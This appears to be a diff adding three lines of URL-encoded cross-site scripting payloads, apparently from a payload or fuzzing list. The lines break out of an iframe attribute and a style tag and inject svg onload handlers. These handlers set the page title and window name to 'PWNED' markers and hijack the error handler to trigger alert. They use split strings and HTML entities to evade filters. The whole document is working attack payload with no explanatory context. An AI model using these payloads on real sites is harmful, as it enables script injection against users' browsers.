@@ -1,0 +1,3 @@
+ZKB"></iframe><svg/onload%3Dtop%5B%27docu%27%2B%27ment%27%5D.title%3D%27TVC6-TITLE-PWNED%27%3Btop.name%3D%27TVC6-OK2%27>
+1,marker:alert(1),z:1
+%23red<%2Fstyle><svg%20onload%3Dtop%5B%27docu%27%2B%27ment%27%5D.title%3D%27PWNED-TITLE%27%3Btop.name%3D%27ALERT-XSS%27%3Btop.onerror%3Dtop%5B%27%26%2397%3Blert%27%5D%3Btop.undefvar.x>
